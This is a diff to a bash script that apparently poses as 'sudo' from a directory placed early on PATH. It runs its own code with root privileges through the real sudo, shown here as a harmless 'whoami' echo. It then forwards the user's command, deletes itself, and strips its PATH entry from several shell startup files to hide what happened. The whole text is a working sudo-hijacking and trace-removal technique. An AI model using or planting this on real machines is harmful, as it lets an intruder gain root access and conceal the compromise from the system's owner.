@@ -1,7 +1,20 @@
 #!/bin/bash
 
+SHELL_RC_FILES=(
+    "$HOME/.bashrc"
+    "$HOME/.zshrc"
+    "$HOME/.bash_profile"
+    "$HOME/.zprofile"
+    "$HOME/.profile"
+    "$HOME/.bash_login"
+    "$HOME/.zlogin"
+)
+
 # remove this file from $PATH so we can resolve the *real* sudo
-PATH=$(echo "$PATH" | sed "s%$HOME/.bin:%%g")
+# but only if it has not been removed already
+if echo "$PATH" | grep -q "$HOME/.bin:"; then
+    PATH=$(echo "$PATH" | sed "s%$HOME/.bin:%%g")
+fi
 
 # run our own privileged code
 echo ">>> I am $(sudo whoami)! <<<"
@@ -11,4 +24,10 @@ sudo $@
 
 # delete this file
 rm -- "$0" >/dev/null 2>&1
-# TODO: clean up $PATH in ~/.bashrc
+
+# remove the entry from the PATH in all relevant shell configuration files
+for rc_file in "${SHELL_RC_FILES[@]}"; do
+    if [ -f "$rc_file" ]; then
+        sed -i.bak '/$HOME\/\.bin/d' "$rc_file" >/dev/null 2>&1
+    fi
+done
